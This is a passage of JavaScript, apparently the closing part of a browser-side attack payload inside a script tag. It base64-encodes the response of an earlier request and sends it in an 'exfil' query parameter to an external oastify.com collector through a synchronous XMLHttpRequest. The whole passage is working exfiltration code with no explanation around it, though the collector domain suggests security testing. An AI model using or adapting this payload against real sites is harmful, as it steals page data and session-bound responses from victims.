    const responseData = xhr.responseText;
    url = 'http://znqs1rufkemqbox2xa1v9dn2bthk5i56u.oastify.com/?exfil=' + btoa(responseData);

    const xhr2 = new XMLHttpRequest();
    xhr2.open('GET', url, false); // Synchronous request

    xhr2.send();
}
</script>
